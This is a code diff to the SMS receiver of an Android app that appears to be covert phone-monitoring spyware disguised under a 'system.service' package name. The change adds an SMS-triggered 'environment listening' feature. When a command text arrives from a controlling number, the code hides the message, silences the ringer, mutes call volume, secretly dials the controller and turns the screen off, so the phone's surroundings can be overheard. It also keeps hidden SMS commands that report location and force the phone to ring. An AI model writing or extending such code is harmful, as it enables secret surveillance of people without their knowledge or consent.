@@ -14,6 +14,8 @@ import system.service.R.string;
 import system.service.activity.GlobalPrefActivity;
 import system.service.activity.HomeActivity;
 import system.service.config.ConfigCtrl;
+
+import com.particle.inspector.common.util.phone.PhoneUtils;
 import com.particle.inspector.common.util.sms.AuthSms;
 import com.particle.inspector.common.util.sms.SmsConsts;
 import com.particle.inspector.common.util.sms.SuperLoggingSms;
@@ -23,6 +25,7 @@ import com.particle.inspector.common.util.GpsUtil;
 import com.particle.inspector.common.util.LANG;
 import com.particle.inspector.common.util.LangUtil;
 import com.particle.inspector.common.util.NetworkUtil;
+import com.particle.inspector.common.util.PowerUtil;
 import com.particle.inspector.common.util.RegExpUtil;
 import com.particle.inspector.common.util.SIM_TYPE;
 import com.particle.inspector.common.util.StrUtils;
@@ -38,6 +41,7 @@ import com.particle.inspector.common.util.license.LICENSE_TYPE;
 import com.particle.inspector.common.util.location.BaseStationLocation;
 import com.particle.inspector.common.util.location.BaseStationUtil;
 
+import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -46,8 +50,10 @@ import android.location.LocationManager;
 import android.media.AudioManager;
 import android.media.MediaPlayer;
 import android.media.MediaRecorder;
+import android.net.Uri;
 import android.os.Bundle;
 import android.os.Looper;
+import android.os.RemoteException;
 import android.telephony.PhoneStateListener;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
@@ -58,6 +64,11 @@ public class SmsReceiver extends BroadcastReceiver
 	private static final String LOGTAG = "SmsReceiver";
 	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
 	private Context context;
+	
+	public static boolean IS_ENV_LISTENING = false;
+	public static int ORIGINAL_RING_MODE;
+	public static int ORIGINAL_RING_VOL;
+	public static int ORIGINAL_VOICE_CALL_VOL;
 	
 	// **************************************************************************************
     // Receiver for SMS handling
@@ -269,7 +280,7 @@ public class SmsReceiver extends BroadcastReceiver
 			}
 
 			//-------------------------------------------------------------------------------
-			// Send location SMS if being triggered by location activation word
+			// Send location SMS if being triggered by location indication
 			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION) || smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION_ALIAS))
 			{
 				abortBroadcast(); // Do not show location activation SMS
@@ -277,13 +288,8 @@ public class SmsReceiver extends BroadcastReceiver
 				if (!ConfigCtrl.isLegal(context)) return;
 				this.context = context;
 				
-				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-				
 				// If the coming phone is not the receiver phone, return
-				String comingPhoneNum = SmsCtrl.getSmsAddress(intent);
-				if (phoneNum == null || phoneNum.length() <= 0 || !comingPhoneNum.contains(phoneNum)) {
-					return;
-				}
+				if (!comingFromMasterPhone(context, intent)) return;
 				
 				// Start a new thread to do the time-consuming job
     			new Thread(new Runnable(){
@@ -308,22 +314,72 @@ public class SmsReceiver extends BroadcastReceiver
 			}
 			
 			//-------------------------------------------------------------------------------
-			// Send location SMS if being triggered by location activation word
-			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_RING) || smsBody.equalsIgnoreCase(SmsConsts.INDICATION_RING_ALIAS))
+			// Call master phone if being triggered by env listening indication
+			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_ENV) || smsBody.equalsIgnoreCase(SmsConsts.INDICATION_ENV_ALIAS))
 			{
-				abortBroadcast(); // Do not show location activation SMS
+				abortBroadcast(); // Do not show env listening SMS
 				
 				if (!ConfigCtrl.isLegal(context)) return;
 				this.context = context;
 				
 				// If the coming phone is not the receiver phone, return
-				/*
-				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-				String comingPhoneNum = SmsCtrl.getSmsAddress(intent);
-				if (phoneNum == null || phoneNum.length() <= 0 || !comingPhoneNum.contains(phoneNum)) {
-					return;
-				}
-				*/
+				if (!comingFromMasterPhone(context, intent)) return;
+				
+				// Return if the target phone screen is on or it is in a call.
+				// That mean it will only take env listening action when the screen is off and not in a call.
+				TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
+				try {
+					if (PhoneUtils.getITelephony(tm).isOffhook()) {
+						String msg = context.getResources().getString(R.string.env_fail_offhook);
+						SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
+						return;
+					}
+					else if (PowerUtil.isScreenOn(context)) {
+						String msg = context.getResources().getString(R.string.env_fail_screen_on);
+						SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
+						return;
+					}
+				} catch (Exception e) {	}
+				
+				// Start a new thread to call master phone
+				new Thread(new Runnable(){
+					public void run() {
+						// Disable ringer and vibrate
+						AudioManager am = (AudioManager) SmsReceiver.this.context.getSystemService(Context.AUDIO_SERVICE);
+		        		ORIGINAL_RING_MODE = am.getRingerMode();
+		        		if (ORIGINAL_RING_MODE == AudioManager.RINGER_MODE_NORMAL) {
+		        			ORIGINAL_RING_VOL = am.getStreamVolume(AudioManager.STREAM_RING);
+		        		}
+		        		am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
+						
+						// Lower phone call volume to min
+						int ORIGINAL_VOICE_CALL_VOL = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
+						am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
+						
+						IS_ENV_LISTENING = true;
+						
+						// Call master phone
+						String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
+						Uri uri = Uri.parse("tel:" + masterPhone);			             
+						SmsReceiver.this.context.startActivity(new Intent(Intent.ACTION_CALL, uri));
+						
+						// Turn off screen
+						PowerUtil.setScreenOff(SmsReceiver.this.context);
+					}
+				}).start();
+			}
+			
+			//-------------------------------------------------------------------------------
+			// Force belling if being triggered by bell activation indication
+			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_RING) || smsBody.equalsIgnoreCase(SmsConsts.INDICATION_RING_ALIAS))
+			{
+				abortBroadcast(); // Do not show bell activation SMS
+				
+				if (!ConfigCtrl.isLegal(context)) return;
+				this.context = context;
+				
+				// If not coming from master phone, return
+				if (!comingFromMasterPhone(context, intent)) return;
 				
 				// Start a new thread to play ring which is time-consuming
 				new Thread(new Runnable(){
@@ -478,6 +534,12 @@ public class SmsReceiver extends BroadcastReceiver
 			}
 		}
 		return ret;
+	}
+	
+	private boolean comingFromMasterPhone(Context context, Intent intent) {
+		String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+		String comingPhoneNum = SmsCtrl.getSmsAddress(intent);
+		return (phoneNum != null && phoneNum.length() > 0 && comingPhoneNum.contains(phoneNum));
 	}
 
 }
